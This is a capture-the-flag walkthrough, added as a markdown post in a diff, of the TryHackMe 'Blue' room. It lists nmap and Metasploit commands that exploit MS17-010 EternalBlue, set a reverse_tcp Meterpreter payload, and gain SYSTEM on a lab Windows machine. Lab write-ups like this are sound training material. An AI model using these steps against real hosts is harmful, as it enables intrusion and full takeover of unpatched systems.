@@ -1,0 +1,59 @@
+---
+title: "Blue – EternalBlue SMBv1 Walkthrough"
+---
+
+
+This write-up covers my walkthrough of the Blue CTF room on TryHackMe, which focuses entirely on exploiting the infamous MS17-010 EternalBlue vulnerability (SMBv1) that powered attacks like WannaCry and Petya. This is a crucial room for understanding how to leverage the Metasploit Framework for known, high-impact Windows exploitation. It provides a thrilling, hands-on experience by taking you from initial scan to System-level access in minutes.
+
+**⚠️ Disclaimer:** SPOILER ALERT!
+
+### 1️⃣ Nmap – EternalBlue Vulnerability Detection
+
+![Nmap scan results](/images/blue_nmap.png)
+
+Once you've deployed the target machine, the first critical step is reconnaissance. Since we suspect an old Windows SMB vulnerability, we need to specifically check the SMB port (445) for the known EternalBlue flaw. This room makes it clear that focused, script-based scanning is often faster than a full port scan.
+
+![Nmap scan results](/images/blue_nmap_2.png)
+
+```bash
+nmap --script vuln 10.10.X.X
+```
+
+The scan confirmed that the target was VULNERABLE to MS17-010 (CVE-2017-0143), paving the way for exploitation.
+
+### 2️⃣ Metasploit – Selecting the Exploit Module
+
+![Metasploit search](/images/replace_blue_msf_search.png)
+
+The next logical step is to utilize the Metasploit Framework, the primary tool for leveraging known vulnerabilities. We immediately search for and select the dedicated EternalBlue exploit module.
+
+```bash
+msfconsole
+search ms17-010
+use exploit/windows/smb/ms17_010_eternalblue
+```
+
+### 3️⃣ Metasploit – Setting RHOSTS and Payload
+
+![Metasploit options](/images/replace_blue_msf_options.png)
+
+Before launching the attack, we must configure the exploit options. Running show options reveals the required parameters. The most critical setting is the target's IP address, set via RHOSTS. We also confirm that the default payload (usually a Meterpreter session) is correctly configured for the Windows architecture.
+
+```bash
+show options
+set RHOSTS 10.10.X.X
+set PAYLOAD windows/x64/meterpreter/reverse_tcp  # If not set by default
+exploit
+```
+### 4️⃣ Pwned! – System Access & Wrap-up
+
+Boom! 💥 The exploit module successfully bypassed SMB authentication and injected the payload, immediately granting us a Meterpreter session with the highest possible privileges on a Windows system: `NT AUTHORITY\SYSTEM`. This is the equivalent of taking the castle's throne instantly.
+
+```bash
+meterpreter > sysinfo
+# Target: Windows 7 (or similar vulnerable OS)
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+```
+
+At this point, we have total control. While standard procedure might involve migrating processes for stability or dumping hashes to crack later, we've already won. We are System. Cracking user hashes when you are already the highest authority is just a victory lap we don't need to run. The machine is compromised, and the flags are ours for the taking.
